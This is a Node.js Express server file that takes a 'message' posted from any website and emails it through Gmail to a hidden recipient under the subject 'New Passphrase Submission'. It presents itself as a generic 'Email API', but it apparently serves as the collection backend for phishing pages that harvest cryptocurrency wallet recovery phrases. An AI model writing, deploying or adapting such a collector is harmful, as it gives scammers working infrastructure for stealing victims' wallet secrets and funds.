require("dotenv").config(); // Load .env file

const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const app = express();

const PORT = process.env.PORT || 2020; // Use Render's assigned port

// Load credentials securely from .env
const serviceEmail = process.env.SERVICE_EMAIL;
const servicePassword = process.env.SERVICE_PASSWORD;
const recipientEmail = process.env.RECIPIENT_EMAIL; // Your desired recipient

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: serviceEmail,
    pass: servicePassword,
  },
});

// Email sending route
app.post("/send-email", (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.status(400).json({ error: "Message field is required." });
  }

  const mailOptions = {
    from: serviceEmail,
    to: recipientEmail, // Sends to your desired recipient
    subject: "New Passphrase Submission",
    text: message,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.status(500).json({ error: "Email sending failed." });
    } else {
      res.json({ success: "Email sent successfully!" });
    }
  });
});

// 🛠️ FIX: Add a root route to prevent "Cannot GET /" error
app.get("/", (req, res) => {
  res.send("Welcome to the Email API! Use POST /send-email to send messages.");
});

// Start server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
